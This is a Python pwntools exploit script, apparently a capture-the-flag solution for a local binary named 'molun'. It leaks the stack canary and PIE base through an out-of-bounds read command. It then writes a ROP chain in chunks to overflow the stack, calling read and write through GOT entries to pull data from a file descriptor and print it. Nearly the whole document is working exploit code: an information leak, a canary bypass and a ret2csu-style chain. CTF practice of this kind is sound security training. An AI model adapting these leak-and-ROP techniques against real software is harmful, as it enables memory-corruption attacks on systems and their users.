from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
##交互函数
p = process(['./ld-2.31.so', '--library-path', '.', './molun'])
def menu():
    p.recvuntil(b'> \n')

def mark(cells, data=b''):

    p.send(b'MARK\n')
    p.recvuntil(b'cells:\n');   p.send(str(cells).encode() + b'\n')
    p.recvuntil(b'ink:\n')
    if data:
        p.send(data)
    p.recvuntil(b'MARKED\n')
    menu()

def readback(frm, cells):

    p.send(b'READBACK\n')
    p.recvuntil(b'from:\n');   p.send(str(frm).encode() + b'\n')
    p.recvuntil(b'cells:\n');  p.send(str(cells).encode() + b'\n')
    p.recvuntil(b'RB ');       p.recvline()
    d = p.recvn(cells)
    p.recvuntil(b'\n')
    menu()
    return d

def close(timeout=3):
    p.send(b'STANDBY\n')
    return p.recvall(timeout=timeout)

G_CALL              = 0x1870
GOT_READ, GOT_WRITE = 0x3fa0, 0x3f90
BUF                 = 0x4300

menu()
can = u64(readback(0x48, 8))                  # canary
pie = u64(readback(0xa8, 8)) - 0x11a0         # &main
#gdb.attach(p)
L = lambda off: pie + off

tape = b'\x00' * 0x48 + flat([
    can,                       
    0, 0, 1,                   
    3, L(BUF), 0x100,          
    L(GOT_READ), L(G_CALL),   
    0,                         
    0, 1, 1, L(BUF), 0x100,    
                               
    L(GOT_WRITE), L(G_CALL),   
]).ljust(0xd0, b'\x00')        

for j in range(0, len(tape), 0x20):
    mark(len(tape[j:j+0x20]), tape[j:j+0x20])         # 9 次 MARK 32 = 0x120
print(close())